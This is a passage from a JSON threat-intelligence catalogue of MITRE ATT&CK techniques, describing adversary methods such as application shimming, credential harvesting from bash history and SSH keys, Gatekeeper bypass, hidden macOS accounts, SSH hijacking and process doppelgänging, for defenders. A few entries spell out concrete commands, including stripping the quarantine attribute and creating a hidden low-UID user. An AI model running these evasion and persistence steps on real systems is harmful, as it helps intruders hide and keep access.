      "description": "The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Endgame Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses [Hooking](https://attack.mitre.org/techniques/T1179) to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to [Hooking](https://attack.mitre.org/techniques/T1179), utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.",
      "meta": {
        "external_id": "T1138",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "Loaded DLLs",
          "System calls",
          "Windows Registry",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1138",
          "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
          "https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf"
        ]
      },
      "uuid": "7c93aa74-4bc0-4a9e-90ea-f25f86301566",
      "value": "Application Shimming - T1138"
    },
    {
      "description": "This technique has been deprecated. Please see ATT&CK's Initial Access and Execution tactics for replacement techniques.\n\nAttempt to use default vendor credentials, brute force credentials, or previously obtained legitimate credentials to authenticate remotely. This access could be to a web portal, through a VPN, or in a phone app. (Citation: Remote Access Healthcare) (Citation: RDP Point of Sale)",
      "meta": {
        "external_id": "T1381",
        "kill_chain": [
          "mitre-pre-attack:launch"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1381"
        ]
      },
      "uuid": "4dfb98ea-03cc-4a9c-a3a7-b22e14f126c4",
      "value": "Authentication attempt - T1381"
    },
    {
      "description": "Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
      "meta": {
        "external_id": "CAPEC-163",
        "kill_chain": [
          "mitre-attack:initial-access"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Packet capture",
          "Network intrusion detection system",
          "Detonation chamber",
          "Email gateway",
          "Mail server"
        ],
        "mitre_platforms": [
          "Windows",
          "macOS",
          "Linux"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1193",
          "https://capec.mitre.org/data/definitions/163.html"
        ]
      },
      "uuid": "6aac77c4-eaf2-4366-8c13-ce50ab951f38",
      "value": "Spearphishing Attachment - T1193"
    },
    {
      "description": "Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",
      "meta": {
        "external_id": "T1139",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1139",
          "http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way"
        ]
      },
      "uuid": "44dca04b-808d-46ca-b25f-d85236d4b9f8",
      "value": "Bash History - T1139"
    },
    {
      "description": "In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called <code>com.apple.quarantine</code>. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. \n\nApps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag. Additionally, other utilities or events like drive-by downloads don’t necessarily set it either. This completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware Persistence) The presence of the quarantine flag can be checked by the xattr command <code>xattr /path/to/MyApp.app</code> for <code>com.apple.quarantine</code>. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, <code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>. (Citation: Clearing quarantine attribute) (Citation: OceanLotus for OS X)\n \nIn typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)",
      "meta": {
        "external_id": "T1144",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1144",
          "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
          "https://derflounder.wordpress.com/2012/11/20/clearing-the-quarantine-extended-attribute-from-downloaded-applications/",
          "https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update",
          "https://blog.malwarebytes.com/cybercrime/2015/10/bypassing-apples-gatekeeper/"
        ]
      },
      "uuid": "6fb6408c-0db3-41d9-a3a1-a32e5f16454e",
      "value": "Gatekeeper Bypass - T1144"
    },
    {
      "description": "Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)\n\nAdversaries may gather private keys from compromised systems for use in authenticating to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:\\Users\\(username)\\.ssh\\</code> on Windows.\n\nPrivate keys should require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)",
      "meta": {
        "external_id": "T1145",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1145",
          "https://en.wikipedia.org/wiki/Public-key_cryptography",
          "https://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf",
          "https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/"
        ]
      },
      "uuid": "56ff457d-5e39-492b-974c-dfd2b8603ffe",
      "value": "Private Keys - T1145"
    },
    {
      "description": "An adversary with physical access to a mobile device may seek to bypass the device's lockscreen.\n\n### Biometric Spoofing\nIf biometric authentication is used, an adversary could attempt to spoof a mobile device's biometric authentication mechanism(Citation: SRLabs-Fingerprint)(Citation: SecureIDNews-Spoof)(Citation: TheSun-FaceID).\n\niOS partly mitigates this attack by requiring the device passcode rather than a fingerprint to unlock the device after every device restart and after 48 hours since the device was last unlocked (Citation: Apple-TouchID). Android has similar mitigations.\n\n### Device Unlock Code Guessing or Brute Force\nAn adversary could attempt to brute-force or otherwise guess the lockscreen passcode (typically a PIN or password), including physically observing (\"shoulder surfing\") the device owner's use of the lockscreen passcode. \n\n### Exploit Other Device Lockscreen Vulnerabilities\nTechniques have periodically been demonstrated that exploit vulnerabilities on Android (Citation: Wired-AndroidBypass), iOS (Citation: Kaspersky-iOSBypass), or other mobile devices to bypass the device lockscreen. The vulnerabilities are generally patched by the device/operating system vendor once they become aware of their existence.",
      "meta": {
        "external_id": "T1461",
        "kill_chain": [
          "mitre-mobile-attack:initial-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1461",
          "https://srlabs.de/bites/spoofing-fingerprints/",
          "https://thehackernews.com/2016/05/android-kernal-exploit.htmlhttps://www.secureidnews.com/news-item/another-spoof-of-mobile-biometrics/",
          "https://www.thesun.co.uk/tech/5584082/iphone-x-face-unlock-tricked-broken/",
          "https://support.apple.com/en-us/HT204587",
          "https://www.wired.com/2015/09/hack-brief-new-emergency-number-hack-easily-bypasses-android-lock-screens/",
          "https://threatpost.com/ios-10-passcode-bypass-can-access-photos-contacts/122033/"
        ]
      },
      "uuid": "dfe29258-ce59-421c-9dee-e85cb9fa90cd",
      "value": "Lockscreen Bypass - T1461"
    },
    {
      "description": "Adversaries may capture user input to obtain credentials or other information from the user through various methods.\n\nMalware may masquerade as a legitimate third-party keyboard to record user keystrokes.(Citation: Zeltser-Keyboard) On both Android and iOS, users must explicitly authorize the use of third-party keyboard apps. Users should be advised to use extreme caution before granting this authorization when it is requested.\n\nOn Android, malware may abuse accessibility features to record keystrokes by registering an `AccessibilityService` class, overriding the `onAccessibilityEvent` method, and listening for the `AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED` event type. The event object passed into the function will contain the data that the user typed.\n\nAdditional methods of keylogging may be possible if root access is available.",
      "meta": {
        "external_id": "T1417",
        "kill_chain": [
          "mitre-mobile-attack:collection",
          "mitre-mobile-attack:credential-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1417",
          "https://zeltser.com/third-party-keyboards-security/"
        ]
      },
      "uuid": "a8c31121-852b-46bd-9ba4-674ae5afe7ad",
      "value": "Input Capture - T1417"
    },
    {
      "description": "Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in <code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> that prevents users with userIDs 500 and lower from appearing at the login screen. By using the [Create Account](https://attack.mitre.org/techniques/T1136) technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: <code>sudo dscl . -create /Users/username UniqueID 401</code> (Citation: Cybereason OSX Pirrit).",
      "meta": {
        "external_id": "T1147",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Authentication logs",
          "File monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1147",
          "https://www2.cybereason.com/research-osx-pirrit-mac-os-x-secuirty"
        ]
      },
      "uuid": "ce73ea43-8e77-47ba-9c11-5e9c9c58b9ff",
      "value": "Hidden Users - T1147"
    },
    {
      "description": "Adversaries may seek to identify all applications installed on the device. One use case for doing so is to identify the presence of endpoint security applications that may increase the adversary's risk of detection. Another use case is to identify the presence of applications that the adversary may wish to target.\n\nOn Android, applications can use methods in the PackageManager class (Citation: Android-PackageManager) to enumerate other apps installed on device, or an entity with shell access can use the pm command line tool.\n\nOn iOS, apps can use private API calls to obtain a list of other apps installed on the device. (Citation: Kurtz-MaliciousiOSApps) However, use of private API calls will likely prevent the application from being distributed through Apple's App Store.",
      "meta": {
        "external_id": "T1418",
        "kill_chain": [
          "mitre-mobile-attack:defense-evasion",
          "mitre-mobile-attack:discovery"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1418",
          "https://developer.android.com/reference/android/content/pm/PackageManager.html",
          "https://andreas-kurtz.de/2014/09/malicious-ios-apps/"
        ]
      },
      "uuid": "198ce408-1470-45ee-b47f-7056050d4fc2",
      "value": "Application Discovery - T1418"
    },
    {
      "description": "Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. (Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH credentials. (Citation: Welivesecurity Ebury SSH)\n\n[SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it injects into an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
      "meta": {
        "external_id": "T1184",
        "kill_chain": [
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "Authentication logs"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1184",
          "https://www.slideshare.net/morisson/mistrusting-and-abusing-ssh-13526219",
          "https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-boileau.pdf",
          "https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking",
          "https://www.welivesecurity.com/2014/02/21/an-in-depth-analysis-of-linuxebury/"
        ]
      },
      "uuid": "c1b11bf7-c68e-4fbf-a95b-28efbe7953bb",
      "value": "SSH Hijacking - T1184"
    },
    {
      "description": "Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.\n\nThese commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
      "meta": {
        "external_id": "T1481",
        "kill_chain": [
          "mitre-mobile-attack:command-and-control"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1481"
        ]
      },
      "uuid": "c6a146ae-9c63-4606-97ff-e261e76e8380",
      "value": "Web Service - T1481"
    },
    {
      "description": "As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary’s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  (Citation: Prolific OSX Malware History). The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn’t know anything was different  (Citation: Methods of Mac Malware Persistence). By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.",
      "meta": {
        "external_id": "T1149",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Binary file metadata",
          "Malware reverse engineering",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1149",
          "https://assets.documentcloud.org/documents/2459197/bit9-carbon-black-threat-research-report-2015.pdf",
          "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf"
        ]
      },
      "uuid": "a0a189c8-d3bd-4991-bf6f-153d185ee373",
      "value": "LC_MAIN Hijacking - T1149"
    },
    {
      "description": "A malicious application can inject input to the user interface to mimic user interaction through the abuse of Android's accessibility APIs.\n\n[Input Injection](https://attack.mitre.org/techniques/T1516) can be achieved using any of the following methods:\n\n* Mimicking user clicks on the screen, for example to steal money from a user's PayPal account.(Citation: android-trojan-steals-paypal-2fa)\n* Injecting global actions, such as `GLOBAL_ACTION_BACK` (programatically mimicking a physical back button press), to trigger actions on behalf of the user.(Citation: Talos Gustuff Apr 2019)\n* Inserting input into text fields on behalf of the user. This method is used legitimately to auto-fill text fields by applications such as password managers.(Citation: bitwarden autofill logins)",
      "meta": {
        "external_id": "T1516",
        "kill_chain": [
          "mitre-mobile-attack:defense-evasion",
          "mitre-mobile-attack:impact"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1516",
          "https://www.welivesecurity.com/2018/12/11/android-trojan-steals-money-paypal-accounts-2fa/",
          "https://blog.talosintelligence.com/2019/04/gustuff-targets-australia.html",
          "https://help.bitwarden.com/article/auto-fill-android/"
        ]
      },
      "uuid": "d1f1337e-aea7-454c-86bd-482a98ffaf62",
      "value": "Input Injection - T1516"
    },
    {
      "description": "Per Apple’s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items (Citation: Startup Items). This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.",
      "meta": {
        "external_id": "T1165",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1165",
          "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html",
          "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf"
        ]
      },
      "uuid": "2ba5aa71-9d15-4b22-b726-56af06d9ad2f",
      "value": "Startup Items - T1165"
    },
    {
      "description": "A malicious application can read notifications sent by the operating system or other applications, which may contain sensitive data such as one-time authentication codes sent over SMS, email, or other mediums. A malicious application can also dismiss notifications to prevent the user from noticing that the notifications arrived and can trigger action buttons contained within notifications.(Citation: ESET 2FA Bypass)",
      "meta": {
        "external_id": "T1517",
        "kill_chain": [
          "mitre-mobile-attack:collection",
          "mitre-mobile-attack:credential-access"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1517",
          "https://www.welivesecurity.com/2019/06/17/malware-google-permissions-2fa-bypass/"
        ]
      },
      "uuid": "39dd7871-f59b-495f-a9a5-3cb8cc50c9b2",
      "value": "Access Notifications - T1517"
    },
    {
      "description": "macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.\n\nA common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)\n\nIf the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.",
      "meta": {
        "external_id": "CAPEC-471",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "File monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1157",
          "https://capec.mitre.org/data/definitions/471.html",
          "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
          "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf"
        ]
      },
      "uuid": "aa8bfbc9-78dc-41a4-a03b-7453e0fdccda",
      "value": "Dylib Hijacking - T1157"
    },
    {
      "description": "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "meta": {
        "external_id": "T1518",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Process command-line parameters",
          "Process monitoring",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1518"
        ]
      },
      "uuid": "e3b6daca-e963-4a69-aee6-ed4fd653ad58",
      "value": "Software Discovery - T1518"
    },
    {
      "description": "Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>$HOME/Library/LaunchAgents</code> (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware). These launch agents have property list files which point to the executables that will be launched (Citation: OSX.Dok Malware).\n \nAdversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  (Citation: Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).",
      "meta": {
        "external_id": "T1159",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1159",
          "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html",
          "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
          "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/",
          "https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/",
          "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/",
          "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
          "https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf",
          "https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update"
        ]
      },
      "uuid": "dd901512-6e37-4155-943b-453e3777b125",
      "value": "Launch Agent - T1159"
    },
    {
      "description": "Browser extensions or plugins are small programs that can add functionality and customize aspects of internet browsers. They can be installed directly or through a browser's app store. Extensions generally have access and permissions to everything that the browser can access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so may not be difficult for malicious extensions to defeat automated scanners and be uploaded. (Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can browse to websites in the background, (Citation: Chrome Extension Crypto Miner) (Citation: ICEBRG Chrome Extensions) steal all information that a user enters into a browser, to include credentials, (Citation: Banker Google Chrome Extension Steals Creds) (Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence. There have been instances of botnets using a persistent backdoor through malicious Chrome extensions. (Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control  (Citation: Chrome Extension C2 Malware).",
      "meta": {
        "external_id": "T1176",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Network protocol analysis",
          "Packet capture",
          "System calls",
          "Process use of network",
          "Process monitoring",
          "Browser extensions"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1176",
          "https://en.wikipedia.org/wiki/Browser_extension",
          "https://developer.chrome.com/extensions",
          "https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43824.pdf",
          "https://www.ghacks.net/2017/09/19/first-chrome-extension-with-javascript-crypto-miner-detected/",
          "https://www.icebrg.io/blog/malicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses",
          "https://isc.sans.edu/forums/diary/BankerGoogleChromeExtensiontargetingBrazil/22722/",
          "https://isc.sans.edu/forums/diary/CatchAll+Google+Chrome+Malicious+Extension+Steals+All+Posted+Data/22976/https:/threatpost.com/malicious-chrome-extension-steals-data-posted-to-any-website/128680/)",
          "https://www.welivesecurity.com/2017/07/20/stantinko-massive-adware-campaign-operating-covertly-since-2012/",
          "https://kjaer.io/extension-malware/"
        ]
      },
      "uuid": "389735f1-f21c-4208-b8f0-f8031e7169b8",
      "value": "Browser Extensions - T1176"
    },
    {
      "description": "In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password. (Citation: OS X Keychain)\n\nIf an adversary can obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS X Keychain) (Citation: OSX Keydnap malware)",
      "meta": {
        "external_id": "T1167",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "Process monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1167",
          "http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain",
          "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
          "http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way"
        ]
      },
      "uuid": "2715c335-1bf2-4efe-9f18-0691317ff83b",
      "value": "Securityd Memory - T1167"
    },
    {
      "description": "Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nAdversaries may leverage TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055) called Process Doppelgänging. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), Process Doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process Doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nProcess Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):\n\n* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load – Create a shared section of memory and load the malicious executable.\n* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate – Create a process from the tainted section of memory and initiate execution.",
      "meta": {
        "external_id": "T1186",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1186",
          "https://msdn.microsoft.com/library/windows/desktop/bb968806.aspx",
          "https://msdn.microsoft.com/library/windows/desktop/dd979526.aspx",
          "https://msdn.microsoft.com/library/windows/desktop/aa365738.aspx",
          "https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf",
          "https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/",
